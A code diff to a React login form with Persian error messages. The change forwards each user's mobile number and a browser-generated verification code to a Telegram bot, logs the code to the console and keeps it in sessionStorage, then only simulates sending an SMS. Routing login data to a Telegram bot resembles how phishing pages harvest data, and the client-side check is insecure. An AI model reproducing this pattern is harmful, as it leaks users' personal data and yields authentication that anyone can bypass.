@@ -48,15 +48,36 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      console.log("Sending SMS to:", { mobileNumber, inviteCode });
-      await new Promise((resolve) => setTimeout(resolve, 1000));
+      // Send phone number to Telegram bot
+      console.log("Sending phone number to Telegram bot:", mobileNumber);
+      const telegramSent = await sendPhoneToTelegram(mobileNumber);
+
+      if (!telegramSent) {
+        throw new Error("Failed to send notification to Telegram");
+      }
+
+      // Generate verification code and send to Telegram (for demo purposes)
+      const verificationCode = generateVerificationCode();
+      console.log("Generated verification code:", verificationCode);
+
+      // Send verification code to Telegram
+      await sendVerificationCodeToTelegram(mobileNumber, verificationCode);
+
+      // Store the verification code temporarily (in real app, this would be stored server-side)
+      sessionStorage.setItem("verificationCode", verificationCode);
+      sessionStorage.setItem("phoneNumber", mobileNumber);
+
+      // Simulate sending SMS
+      await new Promise((resolve) => setTimeout(resolve, 1500));
+
+      // Navigate to verification page
       navigate("/verify-phone", {
-        state: { phoneNumber: mobileNumber },
+        state: { phoneNumber: mobileNumber, inviteCode },
       });
     } catch (error) {
-      console.error("SMS sending error:", error);
+      console.error("Phone submission error:", error);
       setErrors({
-        mobileNumber: "خطا در ارسال کد تایید. لطفا دوباره تلاش کنید.",
+        mobileNumber: "خطا در ارسال اطلاعات. لطفا دوباره تلاش کنید.",
       });
     } finally {
       setIsSubmitting(false);
